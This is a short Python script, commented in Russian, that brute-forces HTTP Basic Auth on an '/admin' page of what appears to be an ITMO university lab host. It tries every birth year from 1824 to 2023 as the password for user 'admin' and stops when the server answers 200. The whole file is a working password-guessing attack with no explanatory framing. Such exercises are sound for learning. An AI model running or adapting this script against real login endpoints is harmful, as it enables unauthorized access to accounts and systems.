import requests
from requests.auth import HTTPBasicAuth

# Начальные параметры
url = "https://c969be6f-c060-41b4-a104-072381f86aac-web.web.lms.itmo.xyz/admin"
username = "admin"

# Перебор возможных годов рождения (от 2 до 199 лет)
for year in range(1824, 2024):
    # Попытка авторизации с использованием Basic Auth
    response = requests.get(url, auth=HTTPBasicAuth(username, str(year)))

    # Если авторизация успешна (код ответа 200), значит мы нашли правильный год
    if response.status_code == 200:
        print(f"Успешная авторизация! Правильный год рождения: {year}")
        break
    else:
        print(f"Попытка с годом {year} не удалась.")
